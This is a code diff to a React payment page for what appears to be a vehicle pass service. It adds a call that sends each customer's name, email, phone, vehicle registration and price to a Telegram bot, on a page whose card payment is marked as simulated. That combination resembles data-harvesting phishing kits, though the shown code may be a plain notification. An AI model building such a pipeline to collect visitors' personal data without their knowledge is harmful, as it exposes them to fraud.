@@ -8,6 +8,7 @@ import { Label } from "@/components/ui/label";
 import { ArrowLeft, Shield, CreditCard } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { saveCustomerInfo, getVehicleData, getDurationData, Vehicle, Duration } from "@/lib/cookies";
+import { sendFormSubmissionNotification } from "@/lib/telegram";
 
 // Credit card brand logo SVG components
 const VisaLogo = ({ className }: { className?: string }) => (
@@ -241,6 +242,20 @@ const PaymentPage = () => {
       phone: formData.phone
     };
     saveCustomerInfo(customerInfo);
+
+    // Send form submission notification to Telegram
+    try {
+      await sendFormSubmissionNotification({
+        name: formData.fullName,
+        email: formData.email,
+        phone: formData.phone,
+        vehicle_registration: vehicle?.registration || '',
+        duration: duration?.label || '',
+        price: `€${duration?.discountedPrice || 0}`
+      });
+    } catch (error) {
+      console.error('Failed to send form submission notification:', error);
+    }
 
     // Simulate payment processing
     setTimeout(() => {
